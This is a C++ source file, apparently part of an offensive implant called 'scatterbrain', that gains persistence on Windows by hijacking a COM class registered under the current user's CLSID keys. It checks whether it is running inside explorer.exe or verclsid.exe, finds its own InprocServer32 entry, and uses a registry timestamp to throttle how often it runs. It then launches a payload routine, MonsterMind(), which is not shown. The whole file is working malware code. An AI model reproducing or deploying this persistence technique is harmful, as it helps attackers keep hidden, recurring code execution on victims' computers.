#include "stdafx.h"
#include "scatterbrain.h"
#include <stdio.h>
#include <tchar.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
using namespace std;

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383

EXTERN_C IMAGE_DOS_HEADER __ImageBase;

typedef unsigned __int64 QWORD;

bool IsHostPersistenceHost()
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;
	DWORD pid = GetCurrentProcessId();
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

	ZeroMemory(&pe32, sizeof(pe32));
	pe32.dwSize = sizeof(pe32);
	if (!Process32First(hSnapshot, &pe32)) return FALSE;

	do
	{
		if (pid == pe32.th32ProcessID)
		{
			if (wcsstr(pe32.szExeFile, L"verclsid.exe") || wcsstr(pe32.szExeFile, L"explorer.exe"))
			{
				return TRUE;
			}
			return FALSE;
		}
	} while (Process32Next(hSnapshot, &pe32));
	return FALSE;
}

// Main worker function that determines the CLSID
// the dll is loaded from then begins execution.
void QueryCLSIDKeys(HKEY hKey)
{
	TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
	DWORD    cbName;                   // size of name string 
	TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
	DWORD    cchClassName = MAX_PATH;  // size of class string 
	DWORD    cSubKeys = 0;               // number of subkeys 
	DWORD    cbMaxSubKey;              // longest subkey size 
	DWORD    cchMaxClass;              // longest class string 
	DWORD    cValues;              // number of values for key 
	DWORD    cchMaxValue;          // longest value name 
	DWORD    cbMaxValueData;       // longest value data 
	DWORD    cbSecurityDescriptor; // size of security descriptor 
	FILETIME ftLastWriteTime;      // last write time 

	DWORD i, retCode;

	WCHAR currentDllPath[MAX_PATH] = { 0 };
	GetModuleFileNameW((HINSTANCE)&__ImageBase, currentDllPath, sizeof(currentDllPath));

	// Get the class name and the value count. 
	retCode = RegQueryInfoKey(
		hKey,                    // key handle 
		achClass,                // buffer for class name 
		&cchClassName,           // size of class string 
		NULL,                    // reserved 
		&cSubKeys,               // number of subkeys 
		&cbMaxSubKey,            // longest subkey size 
		&cchMaxClass,            // longest class string 
		&cValues,                // number of values for this key 
		&cchMaxValue,            // longest value name 
		&cbMaxValueData,         // longest value data 
		&cbSecurityDescriptor,   // security descriptor 
		&ftLastWriteTime);       // last write time 

	// Enumerate the subkeys, until RegEnumKeyEx fails.

	if (cSubKeys)
	{
		// printf("\nNumber of subkeys: %d\n", cSubKeys);

		for (i = 0; i < cSubKeys; i++)
		{
			cbName = MAX_KEY_LENGTH;
			retCode = RegEnumKeyEx(hKey, i,
				achKey,
				&cbName,
				NULL,
				NULL,
				NULL,
				&ftLastWriteTime);
			if (retCode == ERROR_SUCCESS)
			{
				//_tprintf(TEXT("(%d) %s\n"), i + 1, achKey);
				WCHAR classGuidKey[MAX_VALUE_NAME];
				wsprintf(classGuidKey, L"Software\\Classes\\CLSID\\%s\\InprocServer32", achKey);
				//wprintf(L"Formatted new key: %s\n", classGuidKey);
				HKEY clsidKey;
				ZeroMemory(&clsidKey, sizeof(HKEY));
				if (RegOpenKeyEx(HKEY_CURRENT_USER,
					classGuidKey,
					0,
					KEY_READ,
					&clsidKey) == ERROR_SUCCESS)
				{
					TCHAR  achValue[MAX_VALUE_NAME];
					DWORD cchValue = MAX_VALUE_NAME;
					achValue[0] = '\0';
					DWORD size = MAX_PATH;
					WCHAR* dllPath = new WCHAR[MAX_PATH];
					retCode = RegEnumValue(clsidKey, 0,
						achValue,
						&cchValue,
						NULL,
						NULL,
						LPBYTE(dllPath),
						&size);
					if (retCode == ERROR_SUCCESS)
					{
						//wprintf(L"AchKey: %s\n", achKey);
						//wprintf(L"AchValue: %s\n", achValue);
						//wprintf(L"CLSID Dll path: %s\n", dllPath);
						//wprintf(L"Current DLL PATH: %s\n", currentDllPath);
						if (wcsstr(dllPath, currentDllPath))
						{
							// We've found the path. Retrieve date-time value.
							//printf("Dlls match!\n");
							TCHAR dateTimeValueName[9];
							wsprintf(dateTimeValueName, L"%s", L"DateTime");
							DWORD dtValueNameSize = sizeof(dateTimeValueName);
							DWORD dateTime;
							DWORD dateTimeSize = sizeof(DWORD);
							retCode = RegEnumValue(clsidKey, 3,
								dateTimeValueName,
								&dtValueNameSize,
								NULL,
								NULL,
								LPBYTE(&dateTime),
								&dateTimeSize);
							if (retCode == ERROR_SUCCESS)
							{
								//printf("Parsed datetime: %d\n", dateTime);
								DWORD uptime = GetTickCount();
								const BYTE* lpData = (BYTE*)malloc(sizeof(DWORD));
								memcpy((void*)lpData, &uptime, sizeof(DWORD));
								// Ensure DLL
								if (((uptime / 1000 / 60 / 60) - (dateTime / 1000 / 60 / 60)) > 1 ||
									dateTime == 0 ||
									uptime < dateTime)
								{
									// Make the dynamite go boom
									RegCloseKey(clsidKey);
									if (RegOpenKeyEx(HKEY_CURRENT_USER,
										classGuidKey,
										0,
										KEY_WRITE,
										&clsidKey) == ERROR_SUCCESS)
									{
										retCode = RegSetValueEx(
											clsidKey,
											dateTimeValueName,
											NULL,
											REG_DWORD,
											lpData,
											sizeof(DWORD)
										);
										if (retCode == ERROR_SUCCESS)
										{
											MonsterMind();
										}
									}
									else
									{
										
										//printf("Failed to open key for writing.\n");
									}
								}
								else
								{
									
								}
								
							}
							else
							{
								// printf("Failed to parse datetime.\n");
							}
							// printf("%d\n", retCode);
							break;
						}
					}
					RegCloseKey(clsidKey);
				}
			}
		}
	}
	RegCloseKey(hKey);
}

void InitializeBootProceedure()
{
	HKEY clsidKey;
	if (RegOpenKeyEx(HKEY_CURRENT_USER,
		TEXT("Software\\Classes\\CLSID"),
		0,
		KEY_READ,
		&clsidKey) == ERROR_SUCCESS)
	{
		QueryCLSIDKeys(clsidKey);
	}
}